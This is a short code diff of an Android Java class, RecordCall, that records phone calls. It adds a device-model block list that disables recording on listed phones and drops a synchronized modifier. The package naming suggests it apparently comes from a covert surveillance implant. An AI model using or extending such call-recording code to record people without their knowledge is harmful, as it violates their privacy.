@@ -17,6 +17,7 @@ import com.android.dvci.util.Utils;
 import com.android.mm.M;
 import android.media.MediaRecorder.OnErrorListener;
 import android.media.MediaRecorder.OnInfoListener;
+import android.os.Build;
 /*
  * Tested :
  * - 4.0.4 Galaxy nexus maguro -> Doesn't record gsm calls
@@ -40,6 +41,8 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 	private boolean recorder_started=false;
 	private int try_source=0;
 	private int numFailures=0;
+	private String[] blacklistedPhones = {
+	};
 
 	public synchronized static RecordCall self() {
 		if (singleton == null) {
@@ -203,7 +206,7 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 	public boolean isSupported() {
 		return true;
 	}
-	public synchronized boolean stopCall() {
+	public boolean stopCall() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (stopCall) called");
 		}
@@ -321,6 +324,14 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 				Check.log(TAG + "(canRecordAndroid): Android 5.0 unsupported" );
 			}
 			return false;
+		}
+		for ( String model: blacklistedPhones) {
+			if (Build.MODEL.equalsIgnoreCase(model)) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (canRecordAndroid): Phone: " + Build.MODEL + " not supported");
+				}
+				return false;
+			}
 		}
 		return true;
 	}
